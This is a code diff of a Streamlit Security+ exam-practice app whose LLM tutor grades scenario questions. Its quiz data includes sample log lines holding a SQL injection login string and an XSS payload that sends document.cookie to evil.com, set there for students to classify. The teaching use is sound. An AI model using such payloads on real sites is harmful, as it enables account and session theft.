@@ -88,95 +88,29 @@ def grade_pbq(llm, pbq_title, pbq_scenario, user_answers):
     1. Tell the student if they got the configuration completely right, partially right, or wrong.
     2. Go through their answers and explain the "Why" using simple terms.
     3. Provide the definitive correct configuration at the end.
+    
+    CRITICAL INSTRUCTION:
+    If the student got EVERY single part 100% correct, you MUST put the exact phrase "[PASSED]" at the very end of your response. 
+    If they got ANYTHING wrong (even partially), you MUST put the exact phrase "[FAILED]" at the very end of your response.
     """
     prompt = PromptTemplate.from_template(template)
     chain = prompt | llm | StrOutputParser()
     return chain.invoke({"title": pbq_title, "scenario": pbq_scenario, "answers": str(user_answers)})
 
-# 6. PBQ DATABASE (Guided with Word Banks)
+# 6. PBQ DATABASE (Guided with Word Banks & Video Topics)
 PBQ_DB = {
-    1: {
-        "title": "Port Configuration", 
-        "desc": "Match the correct default port number to the network service.", 
-        "type": "match", 
-        "keys": ["SSH", "HTTPS", "RDP", "DNS"],
-        "options": ["22", "23", "53", "80", "443", "3389"]
-    },
-    2: {
-        "title": "Authentication Factors", 
-        "desc": "Categorize the MFA security factors.", 
-        "type": "match", 
-        "keys": ["Password", "Smartcard", "Retina Scan", "PIN"],
-        "options": ["Something you know", "Something you have", "Something you are", "Somewhere you are"]
-    },
-    3: {
-        "title": "Malware Identification", 
-        "desc": "Match the malicious behavior to the correct malware type.", 
-        "type": "match", 
-        "keys": ["Encrypts files and demands payment", "Hides deep in the OS kernel", "Self-replicates across the network", "Disguises itself as legitimate software"],
-        "options": ["Ransomware", "Rootkit", "Worm", "Trojan", "Spyware"]
-    },
-    4: {
-        "title": "Incident Response Lifecycle", 
-        "desc": "Select the correct phase of Incident Response in order.", 
-        "type": "order", 
-        "keys": ["Step 1", "Step 2", "Step 3", "Step 4"],
-        "options": ["Preparation", "Identification", "Containment", "Eradication", "Recovery", "Lessons Learned"]
-    },
-    5: {
-        "title": "Cryptography Types", 
-        "desc": "Classify the encryption algorithm as Symmetric or Asymmetric.", 
-        "type": "match", 
-        "keys": ["AES", "RSA", "DES", "ECC"],
-        "options": ["Symmetric", "Asymmetric", "Hashing"]
-    },
-    6: {
-        "title": "Cloud Deployment Models", 
-        "desc": "Classify the service as IaaS, PaaS, or SaaS.", 
-        "type": "match", 
-        "keys": ["AWS EC2 (Virtual Servers)", "Salesforce (Web CRM)", "Google App Engine", "Microsoft Azure VMs"],
-        "options": ["Infrastructure as a Service (IaaS)", "Platform as a Service (PaaS)", "Software as a Service (SaaS)"]
-    },
-    7: {
-        "title": "Basic Firewall Rule", 
-        "desc": "Create a rule to strictly BLOCK web traffic (HTTP) coming from the IP 192.168.1.50.", 
-        "type": "firewall"
-    },
-    8: {
-        "title": "RAID Configuration", 
-        "desc": "Select the best RAID setup for the given business scenario.", 
-        "type": "match", 
-        "keys": ["High Performance, Zero Fault Tolerance", "Exact Mirroring (Redundancy)", "Striping with Parity (Min 3 drives)"],
-        "options": ["RAID 0", "RAID 1", "RAID 5", "RAID 10"]
-    },
-    9: {
-        "title": "Log Analysis: Database Attack", 
-        "desc": "Look at the web log and identify what type of attack is happening.", 
-        "type": "log", 
-        "log": '10.0.0.5 - - [10/Oct] "GET /login.php?user=admin\' OR \'1\'=\'1&pass=123 HTTP/1.1" 200 4321',
-        "options": ["SQL Injection", "Cross-Site Scripting (XSS)", "Buffer Overflow", "DDoS"]
-    },
-    10: {
-        "title": "Log Analysis: Malicious Script", 
-        "desc": "Analyze the log and identify the attack vector targeting user browsers.", 
-        "type": "log", 
-        "log": '192.168.1.10 - - [12/Oct] "POST /comment.php?body=<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script> HTTP/1.1" 200',
-        "options": ["Cross-Site Scripting (XSS)", "SQL Injection", "Command Injection", "CSRF"]
-    },
-    11: {
-        "title": "Digital Certificates", 
-        "desc": "Match the PKI component to its definition.", 
-        "type": "match", 
-        "keys": ["Used to encrypt data sent to a server", "Kept secret by the server to decrypt data", "A list of revoked/bad certificates"],
-        "options": ["Public Key", "Private Key", "CRL (Certificate Revocation List)", "CSR"]
-    },
-    12: {
-        "title": "Advanced ACL Troubleshooting", 
-        "desc": "Review the firewall rules. A user at 10.1.1.5 cannot reach the secure website (HTTPS) at 10.2.2.10. Which rule number is causing the block?", 
-        "type": "log", 
-        "log": "Rule 1: DENY IP 10.1.1.0/24 to 10.2.2.0/24 PORT 80\nRule 2: DENY IP ANY to 10.2.2.10 PORT 443\nRule 3: ALLOW IP 10.1.1.0/24 to ANY PORT ANY\nRule 4: DENY ALL ALL",
-        "options": ["Rule 1", "Rule 2", "Rule 3", "Rule 4"]
-    }
+    1: {"topic": "Network Ports", "title": "Port Configuration", "desc": "Match the correct default port number to the network service.", "type": "match", "keys": ["SSH", "HTTPS", "RDP", "DNS"], "options": ["22", "23", "53", "80", "443", "3389"]},
+    2: {"topic": "Multifactor Authentication", "title": "Authentication Factors", "desc": "Categorize the MFA security factors.", "type": "match", "keys": ["Password", "Smartcard", "Retina Scan", "PIN"], "options": ["Something you know", "Something you have", "Something you are", "Somewhere you are"]},
+    3: {"topic": "Malware Types", "title": "Malware Identification", "desc": "Match the malicious behavior to the correct malware type.", "type": "match", "keys": ["Encrypts files and demands payment", "Hides deep in the OS kernel", "Self-replicates across the network", "Disguises itself as legitimate software"], "options": ["Ransomware", "Rootkit", "Worm", "Trojan", "Spyware"]},
+    4: {"topic": "Incident Response Phases", "title": "Incident Response Lifecycle", "desc": "Select the correct phase of Incident Response in order.", "type": "order", "keys": ["Step 1", "Step 2", "Step 3", "Step 4"], "options": ["Preparation", "Identification", "Containment", "Eradication", "Recovery", "Lessons Learned"]},
+    5: {"topic": "Cryptography", "title": "Cryptography Types", "desc": "Classify the encryption algorithm as Symmetric or Asymmetric.", "type": "match", "keys": ["AES", "RSA", "DES", "ECC"], "options": ["Symmetric", "Asymmetric", "Hashing"]},
+    6: {"topic": "Cloud Deployment Models", "title": "Cloud Deployment Models", "desc": "Classify the service as IaaS, PaaS, or SaaS.", "type": "match", "keys": ["AWS EC2 (Virtual Servers)", "Salesforce (Web CRM)", "Google App Engine", "Microsoft Azure VMs"], "options": ["Infrastructure as a Service (IaaS)", "Platform as a Service (PaaS)", "Software as a Service (SaaS)"]},
+    7: {"topic": "Firewall Rules", "title": "Basic Firewall Rule", "desc": "Create a rule to strictly BLOCK web traffic (HTTP) coming from the IP 192.168.1.50.", "type": "firewall"},
+    8: {"topic": "RAID Configuration", "title": "RAID Configuration", "desc": "Select the best RAID setup for the given business scenario.", "type": "match", "keys": ["High Performance, Zero Fault Tolerance", "Exact Mirroring (Redundancy)", "Striping with Parity (Min 3 drives)"], "options": ["RAID 0", "RAID 1", "RAID 5", "RAID 10"]},
+    9: {"topic": "SQL Injection", "title": "Log Analysis: Database Attack", "desc": "Look at the web log and identify what type of attack is happening.", "type": "log", "log": '10.0.0.5 - - [10/Oct] "GET /login.php?user=admin\' OR \'1\'=\'1&pass=123 HTTP/1.1" 200 4321', "options": ["SQL Injection", "Cross-Site Scripting (XSS)", "Buffer Overflow", "DDoS"]},
+    10: {"topic": "Cross-Site Scripting XSS", "title": "Log Analysis: Malicious Script", "desc": "Analyze the log and identify the attack vector targeting user browsers.", "type": "log", "log": '192.168.1.10 - - [12/Oct] "POST /comment.php?body=<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script> HTTP/1.1" 200', "options": ["Cross-Site Scripting (XSS)", "SQL Injection", "Command Injection", "CSRF"]},
+    11: {"topic": "Digital Certificates PKI", "title": "Digital Certificates", "desc": "Match the PKI component to its definition.", "type": "match", "keys": ["Used to encrypt data sent to a server", "Kept secret by the server to decrypt data", "A list of revoked/bad certificates"], "options": ["Public Key", "Private Key", "CRL (Certificate Revocation List)", "CSR"]},
+    12: {"topic": "Firewall ACL Troubleshooting", "title": "Advanced ACL Troubleshooting", "desc": "Review the firewall rules. A user at 10.1.1.5 cannot reach the secure website (HTTPS) at 10.2.2.10. Which rule number is causing the block?", "type": "log", "log": "Rule 1: DENY IP 10.1.1.0/24 to 10.2.2.0/24 PORT 80\nRule 2: DENY IP ANY to 10.2.2.10 PORT 443\nRule 3: ALLOW IP 10.1.1.0/24 to ANY PORT ANY\nRule 4: DENY ALL ALL", "options": ["Rule 1", "Rule 2", "Rule 3", "Rule 4"]}
 }
 
 # 7. MAIN APPLICATION
@@ -208,6 +142,7 @@ def main():
         
         st.session_state.app_mode = "Adaptive Simulator"
         st.session_state.pbq_feedback = ""
+        st.session_state.current_pbq_id = None
 
     # --- SIDEBAR NAVIGATION ---
     with st.sidebar:
@@ -240,7 +175,7 @@ def main():
             st.rerun()
 
     # ==========================================
-    # MODE 1: PBQ PRACTICE LAB (GUIDED)
+    # MODE 1: PBQ PRACTICE LAB (DYNAMIC & GUIDED)
     # ==========================================
     if st.session_state.app_mode == "PBQ Practice Lab":
         st.header("💻 Performance-Based Questions (PBQs)")
@@ -249,33 +184,41 @@ def main():
         pbq_id = st.selectbox("Select PBQ Scenario:", list(PBQ_DB.keys()), format_func=lambda x: f"PBQ {x}: {PBQ_DB[x]['title']} (Level {x})")
         pbq = PBQ_DB[pbq_id]
         
+        # --- SHUFFLE LOGIC: Only shuffle once when a new PBQ is selected ---
+        if st.session_state.get('current_pbq_id') != pbq_id:
+            st.session_state.current_pbq_id = pbq_id
+            st.session_state.pbq_feedback = ""
+            
+            if 'keys' in pbq:
+                st.session_state.pbq_keys = random.sample(pbq['keys'], len(pbq['keys']))
+            if 'options' in pbq:
+                st.session_state.pbq_opts = random.sample(pbq['options'], len(pbq['options']))
+        
         st.info(f"**Scenario:** {pbq['desc']}")
         
         user_submission = {}
         with st.form(f"pbq_form_{pbq_id}"):
-            # For Match, Order, and Multiple Choice Log Analysis
             if pbq['type'] in ["match", "order", "log"]:
-                
-                # Show the log block if it exists
                 if 'log' in pbq:
                     st.code(pbq['log'], language='bash')
 
-                # Show Word Bank / Options
-                st.write("### 🗂️ Word Bank / Available Options")
-                st.info(" | ".join(pbq['options']))
-                st.write("---")
+                if 'options' in pbq:
+                    shuffled_opts = st.session_state.get('pbq_opts', pbq['options'])
+                    st.write("### 🗂️ Word Bank / Available Options")
+                    st.info(" | ".join(shuffled_opts))
+                    st.write("---")
 
-                # If it has specific keys to match (like Ports)
                 if 'keys' in pbq:
                     col1, col2 = st.columns(2)
-                    for i, key in enumerate(pbq['keys']):
+                    shuffled_keys = st.session_state.get('pbq_keys', pbq['keys'])
+                    for i, key in enumerate(shuffled_keys):
                         with (col1 if i % 2 == 0 else col2):
-                            user_submission[key] = st.selectbox(f"{key}:", ["-- Select --"] + pbq['options'])
-                # If it's just analyzing a log to find one answer
+                            user_submission[key] = st.selectbox(f"{key}:", ["-- Select --"] + shuffled_opts)
                 else:
-                    user_submission['Answer'] = st.selectbox("Select the correct finding:", ["-- Select --"] + pbq['options'])
+                    if 'options' in pbq:
+                        shuffled_opts = st.session_state.get('pbq_opts', pbq['options'])
+                        user_submission['Answer'] = st.selectbox("Select the correct finding:", ["-- Select --"] + shuffled_opts)
 
-            # For Firewall rules
             elif pbq['type'] == "firewall":
                 col1, col2, col3, col4 = st.columns(4)
                 user_submission['Action'] = col1.selectbox("Action", ["-- Select --", "ALLOW", "DENY"])
@@ -286,19 +229,40 @@ def main():
             submit_pbq = st.form_submit_button("Submit PBQ for Grading")
         
         if submit_pbq:
-            # Check if user left things blank
             if any(val == "-- Select --" or val == "" for val in user_submission.values()):
                 st.error("⚠️ Please select an answer for all fields before submitting.")
             else:
                 with st.spinner("AI Tutor is grading your PBQ..."):
                     st.session_state.pbq_feedback = grade_pbq(llm, pbq['title'], pbq['desc'], user_submission)
         
+        # --- PBQ FEEDBACK & VIDEO REHAB LOGIC ---
         if st.session_state.pbq_feedback:
             st.markdown("---")
+            raw_feedback = st.session_state.pbq_feedback
+            
+            # Detect Grade
+            passed = "[PASSED]" in raw_feedback
+            failed = "[FAILED]" in raw_feedback
+            
+            # Clean tags out of UI
+            clean_feedback = raw_feedback.replace("[PASSED]", "").replace("[FAILED]", "").strip()
+            
             st.warning("🤖 **AI PBQ Evaluation & Grade:**")
-            st.write(st.session_state.pbq_feedback)
-            if st.button("Clear Feedback"):
+            st.write(clean_feedback)
+            
+            # If they missed anything, drop the video link
+            if failed:
+                topic = pbq.get('topic', 'CompTIA Security+')
+                query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
+                st.error("🛑 It looks like you missed some parts of this PBQ.")
+                st.markdown(f"### 📺 [Click Here to Watch a Review Lesson on '{topic}'](https://www.youtube.com/results?search_query={query})")
+            elif passed:
+                st.success("🏆 Perfect Score! Excellent job on this PBQ.")
+
+            if st.button("Clear Feedback & Try Again"):
                 st.session_state.pbq_feedback = ""
+                # Re-shuffles the next time because current_pbq_id logic triggers on next render if we force it
+                st.session_state.current_pbq_id = None 
                 st.rerun()
 
     # ==========================================
@@ -362,58 +326,4 @@ def main():
                         st.session_state.streak = st.session_state.streak - 1 if st.session_state.streak < 0 else -1
                     
                     st.session_state.user_choice = selected_option
-                    st.session_state.is_right = is_right
-                    with st.spinner("AI Tutor is writing your explanation..."):
-                        st.session_state.feedback = get_tutor_feedback(llm, cq["text"], selected_option, cq["correct_letter"], is_right, st.session_state.difficulty)
-                    st.session_state.phase = "reviewing"
-                    st.rerun()
-
-        # REVIEWING PHASE
-        elif st.session_state.phase == "reviewing":
-            st.subheader(f"Question {st.session_state.display_idx}")
-            st.info(cq["text"])
-            st.radio("Your answer:", cq["options"], index=cq["options"].index(st.session_state.user_choice), disabled=True)
-            st.markdown("---")
-            if st.session_state.is_right: st.success(f"✅ Correct! The answer is {cq['correct_letter']}.")
-            else: st.error(f"❌ Incorrect. The correct answer was {cq['correct_letter']}.")
-            
-            st.warning("🤖 **AI Tutor Explanation:**")
-            st.write(st.session_state.feedback)
-            st.markdown("<br>", unsafe_allow_html=True)
-            
-            if st.button("Next Question ➡️"):
-                if st.session_state.streak <= -3:
-                    with st.spinner("Preparing your study timeout..."):
-                        st.session_state.rehab_topic = get_video_topic(llm, cq["text"])
-                    st.session_state.phase = "video_rehab"
-                    st.rerun()
-                else:
-                    st.session_state.db_idx += 1        
-                    st.session_state.display_idx += 1   
-                    st.session_state.current_q = None   
-                    st.session_state.phase = "answering"
-                    st.rerun()
-
-        # VIDEO REHAB PHASE
-        elif st.session_state.phase == "video_rehab":
-            st.error("🛑 Study Timeout Triggered: You've missed 3 questions in a row.")
-            st.write("When we guess, we stop learning. Let's review this concept before moving forward.")
-            st.markdown("---")
-            st.subheader(f"📚 Recommended Review Topic: **{st.session_state.rehab_topic}**")
-            
-            query = urllib.parse.quote(f"Professor Messer SY0-701 {st.session_state.rehab_topic}")
-            st.markdown(f"### 📺 [Click Here to Search YouTube for '{st.session_state.rehab_topic}' Lessons](https://www.youtube.com/results?search_query={query})")
-            
-            user_done = st.text_input("Type **done** when you have finished reviewing:")
-            if user_done.strip().lower() == "done":
-                st.success("Great job reviewing! Let's get back into the exam.")
-                if st.button("Resume Exam ➡️"):
-                    st.session_state.streak = 0
-                    st.session_state.db_idx += 1        
-                    st.session_state.display_idx += 1   
-                    st.session_state.current_q = None   
-                    st.session_state.phase = "answering"
-                    st.rerun()
-
-if __name__ == "__main__":
-    main()
+                    st
